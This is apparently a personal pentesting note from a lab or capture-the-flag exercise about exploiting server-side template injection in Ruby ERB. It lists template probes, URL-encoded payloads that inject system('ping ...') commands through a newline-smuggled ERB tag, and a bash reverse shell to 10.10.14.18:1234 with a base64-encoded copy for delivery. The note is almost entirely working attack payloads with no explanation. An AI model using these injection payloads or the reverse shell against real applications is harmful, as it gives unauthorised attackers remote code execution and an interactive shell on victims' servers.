---
aliases: []
---
# Research
### ERB (Ruby)

^3f8fee

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby ^9f2442
- `{{7*7}} = {{7*7}}`
    
- `${7*7} = ${7*7}`
    
- `<%= 7*7 %> = 49`
     ^d1dd5b
- `<%= foobar %> = Error`
---
### Ping
https://stackoverflow.com/questions/13283674/how-to-ping-ip-addresses-in-php-and-give-results
~~~
system("ping -c 10.10.11.253");
~~~

^a79f05

---

~~~
<%= 2*2 %>
asad%0A<%25%3d+2*2+%25>
system("ping -c 10.10.14.18");
asd%0A<%25%3Dsystem("ping+-c1+10.10.14.18");%25>
~~~

---
### hURL
https://www.kali.org/tools/hurl/
~~~
sh -i >& /dev/tcp/10.10.14.18/1234 0>&1
~~~

~~~
Original :: sh -i >& /dev/tcp/10.10.14.18/1234 0>&1                              
base64 ENcoded :: c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvMTIzNCAwPiYx

Original :: c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvMTIzNCAwPiYx                 
URL ENcoded :: c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvMTIzNCAwPiYx
~~~

